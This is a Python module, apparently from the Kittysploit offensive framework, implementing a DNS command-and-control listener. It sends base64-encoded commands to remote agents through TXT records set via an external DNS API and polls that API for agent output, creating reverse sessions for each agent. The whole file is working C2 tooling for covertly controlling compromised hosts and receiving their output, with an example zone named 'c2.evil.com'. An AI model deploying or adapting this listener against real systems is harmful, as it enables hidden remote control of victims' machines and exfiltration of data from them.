#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
DNS C2 (Kittysploit DNS) - Uses your Kittysploit DNS server API to send commands and receive agent output.
No UDP listener: commands are pushed via API (TXT record), responses are pulled via API (messages).
See docstring for API contract your Kittysploit DNS server must implement.
"""

from kittysploit import *
import threading
import time
import base64
import requests

class Module(Listener):
    """
    DNS C2 via Kittysploit DNS API.
    Uses your DNS server API (api_url + api_key) to create TXT records (commands) and poll for agent messages.
    
    API contract (Kittysploit DNS server must implement):
    - POST {api_url}/c2/command  Body: { domain, client_id, value }  (value = base64 command). Sets TXT for poll.<client_id>.<domain>.
    - GET  {api_url}/c2/messages?domain=...  Returns { messages: [ { client_id, payload, timestamp? } ] }. Agent output sent by agents (e.g. result.<b64>.<client_id>.<domain>).
    - Auth: Header X-API-Key: {api_key} or Authorization: Bearer {api_key}.
    """

    __info__ = {
        'name': 'DNS C2 (Kittysploit DNS)',
        'description': 'Uses Kittysploit DNS server API to send commands and receive agent output. Create URLs via API, no local UDP.',
        'author': 'KittySploit Team',
        'version': '1.0.0',
        'handler': Handler.REVERSE,
        'session_type': SessionType.DNS,
        'references': [],
        'dependencies': ['requests'],
    }

    api_url = OptString("https://dns.kittysploit.com/api/v1", "Kittysploit DNS API base URL", True)
    api_key = OptString("", "API key for Kittysploit DNS", True)
    domain = OptString("c2.local", "C2 zone/domain (e.g. c2.evil.com)", True)
    poll_interval = OptInteger(5, "Poll interval for agent messages (seconds)", False)

    def __init__(self, framework=None):
        super().__init__(framework)
        self.running = False
        self.poll_thread = None
        self._domain_lower = ""
        self._pending_commands = {}
        self._received_output = {}
        self._client_id_to_session = {}
        self._session_to_client_id = {}
        self._last_poll_ts = 0.0

    def _api_headers(self):
        return {
            "X-API-Key": str(self.api_key).strip() if self.api_key else "",
            "Content-Type": "application/json",
        }

    def _api_set_command(self, client_id: str, value: str) -> bool:
        """Tell Kittysploit DNS to set TXT for poll.<client_id>.<domain> = value (base64 command or 'wait')."""
        base_url = (str(self.api_url).strip() or "").rstrip("/")
        if not base_url or not client_id:
            return False
        url = f"{base_url}/c2/command"
        payload = {
            "domain": self._domain_lower,
            "client_id": client_id,
            "value": value,
        }
        try:
            r = requests.post(url, json=payload, headers=self._api_headers(), timeout=15)
            if r.status_code in (200, 201, 204):
                return True
            return False
        except Exception:
            return False

    def _api_get_messages(self):
        """Fetch agent messages from Kittysploit DNS API. Returns list of { client_id, payload }."""
        base_url = (str(self.api_url).strip() or "").rstrip("/")
        if not base_url:
            return []
        url = f"{base_url}/c2/messages"
        params = {"domain": self._domain_lower}
        try:
            r = requests.get(url, params=params, headers=self._api_headers(), timeout=15)
            if r.status_code != 200:
                return []
            data = r.json() if r.text else {}
            return data.get("messages", []) if isinstance(data, dict) else []
        except Exception:
            return []

    def _ensure_session(self, client_id: str, client_ip: str = "api") -> str:
        """Create session for client_id if not exists. Returns session_id."""
        session_id = self._client_id_to_session.get(client_id)
        if session_id:
            return session_id
        session_id = self._create_dns_session(client_id, client_ip)
        if session_id:
            self._client_id_to_session[client_id] = session_id
            self._session_to_client_id[session_id] = client_id
            self._pending_commands[session_id] = []
            self._received_output[session_id] = []
        return session_id or ""

    def _create_dns_session(self, client_id: str, client_ip: str):
        try:
            session_data = {
                "session_type": "dns",
                "domain": self._domain_lower,
                "client_id": client_id,
                "client_ip": client_ip,
                "protocol": "dns",
                "listener_type": "dns_kittysploit",
                "handler": "reverse",
            }
            return self._create_session("reverse", client_ip or "api", 0, session_data)
        except Exception as e:
            print_error(f"Error creating DNS session: {e}")
            return None

    def _poll_loop(self):
        while self.running:
            try:
                for msg in self._api_get_messages():
                    cid = msg.get("client_id")
                    payload = msg.get("payload", "")
                    if not cid:
                        continue
                    session_id = self._ensure_session(cid, "api")
                    if session_id and payload:
                        self._append_output(session_id, payload)
            except Exception:
                pass
            for _ in range(max(1, int(self.poll_interval))):
                if not self.running:
                    break
                time.sleep(1)

    def run(self, background=False):
        if not str(self.api_key).strip():
            print_error("api_key is required for Kittysploit DNS")
            return False
        self._domain_lower = (str(self.domain).strip() or "c2.local").lower().rstrip(".")
        interval = int(self.poll_interval) if self.poll_interval is not None else 5
        self.poll_interval = max(1, interval)
        self.running = True
        self.poll_thread = threading.Thread(target=self._poll_loop, daemon=True)
        self.poll_thread.start()
        time.sleep(0.5)
        print_success(f"DNS C2 (Kittysploit DNS) started for zone {self._domain_lower}")
        print_info("Commands are sent via API (TXT); agent messages are polled from API.")
        if background:
            return True
        try:
            while self.running:
                time.sleep(0.2)
        except KeyboardInterrupt:
            self.running = False
        return True

    def set_pending_command(self, session_id: str, cmd: str):
        """Send command to Kittysploit DNS API (sets TXT for poll.<client_id>.<domain>)."""
        client_id = self._session_to_client_id.get(session_id)
        if not client_id:
            return
        value = base64.b64encode(cmd.encode("utf-8", errors="replace")).decode("ascii")
        if len(value) > 255:
            value = value[:255]
        self._api_set_command(client_id, value)

    def _append_output(self, session_id: str, text: str):
        if session_id not in self._received_output:
            self._received_output[session_id] = []
        self._received_output[session_id].append(text)
        if len(self._received_output[session_id]) > 500:
            self._received_output[session_id] = self._received_output[session_id][-500:]

    def get_output(self, session_id: str, clear=False) -> str:
        lines = self._received_output.get(session_id, [])
        out = "\n".join(lines)
        if clear:
            self._received_output[session_id] = []
        return out

    def get_output_lines(self, session_id: str, last_n=50) -> list:
        lines = self._received_output.get(session_id, [])
        return lines[-last_n:] if lines else []

    def shutdown(self):
        self.running = False
        if self.poll_thread and self.poll_thread.is_alive():
            self.poll_thread.join(timeout=3)
        print_info("DNS C2 (Kittysploit DNS) stopped")
